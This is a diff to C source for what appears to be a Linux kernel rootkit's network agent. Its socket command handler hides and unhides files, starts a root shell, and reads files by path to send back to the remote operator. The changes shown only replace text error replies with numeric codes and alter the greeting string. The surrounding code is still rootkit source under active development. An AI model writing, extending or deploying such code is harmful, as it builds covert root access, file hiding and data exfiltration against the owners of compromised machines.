@@ -79,7 +79,7 @@ static int rk_agent_list(struct rk_agent *agent, struct socket *socket,
 	if (command->list_index >= list->count) {
 		spin_unlock_irqrestore(&list->lock, flags);
 		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"ERR index", 9);
+				      (const unsigned char *)"ERR 2", 5);
 	}
 	reply_length = scnprintf(reply, sizeof(reply), "ENTRY %u %s",
 				 command->list_index,
@@ -95,7 +95,7 @@ static int rk_agent_ps(struct rk_agent *agent, struct socket *socket,
 		return rk_agent_reply(agent, socket,
 				      (const unsigned char *)"PS 0", 4);
 	return rk_agent_reply(agent, socket,
-			      (const unsigned char *)"ERR index", 9);
+			      (const unsigned char *)"ERR 2", 5);
 }
 
 static int rk_agent_ports(struct rk_agent *agent, struct socket *socket,
@@ -105,14 +105,14 @@ static int rk_agent_ports(struct rk_agent *agent, struct socket *socket,
 		return rk_agent_reply(agent, socket,
 				      (const unsigned char *)"PORTS 0", 7);
 	return rk_agent_reply(agent, socket,
-			      (const unsigned char *)"ERR index", 9);
+			      (const unsigned char *)"ERR 2", 5);
 }
 
 static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 			    const unsigned char *payload, size_t payload_length,
 			    bool *close_session)
 {
-	static const unsigned char error_reply[] = "ERR";
+	static const unsigned char error_reply[] = "ERR 6";
 	unsigned char reply[256];
 	struct rk_command command;
 	size_t reply_length;
@@ -169,9 +169,9 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 		}
 		if (error == -EBUSY)
 			return rk_agent_reply(agent, socket,
-					      (const unsigned char *)"ERR busy", 8);
+					      (const unsigned char *)"ERR 4", 5);
 		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"ERR shell", 9);
+				      (const unsigned char *)"ERR 5", 5);
 	}
 	case RK_COMMAND_SHELL_STATUS: {
 		struct rk_root_shell_status shell_status;
@@ -195,7 +195,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 		error = rk_target_add(list, command.hide_value);
 		if (error < 0)
 			return rk_agent_reply(agent, socket,
-					      (const unsigned char *)"ERR full", 8);
+					      (const unsigned char *)"ERR 1", 5);
 		reply_length = scnprintf(reply, sizeof(reply), "OK %d", error);
 		return rk_agent_reply(agent, socket, reply, reply_length);
 	case RK_COMMAND_UNHIDE_FILE:
@@ -208,8 +208,8 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 		error = rk_target_remove(list, command.unhide_index,
 					 removed, sizeof(removed));
 		if (error)
-			return rk_agent_reply(agent, socket, error_reply,
-					      sizeof(error_reply) - 1);
+			return rk_agent_reply(agent, socket,
+					      (const unsigned char *)"ERR 2", 5);
 		reply_length = scnprintf(reply, sizeof(reply), "OK %s", removed);
 		return rk_agent_reply(agent, socket, reply, reply_length);
 	}
@@ -256,7 +256,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 		f = filp_open(command.hide_value, O_RDONLY, 0);
 		if (IS_ERR(f))
 			return rk_agent_reply(agent, socket,
-					      (const unsigned char *)"ERR open", 8);
+					      (const unsigned char *)"ERR 3", 5);
 		total = i_size_read(file_inode(f));
 		reply_length = scnprintf(reply, sizeof(reply), "FILE %lld", total);
 		error = rk_agent_reply(agent, socket, reply, reply_length);
@@ -293,7 +293,7 @@ download_close:
 
 static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
 {
-	static const unsigned char hello[] = "HELLO";
+	static const unsigned char hello[] = "HELLO 1";
 	u64 session;
 	int error;
 
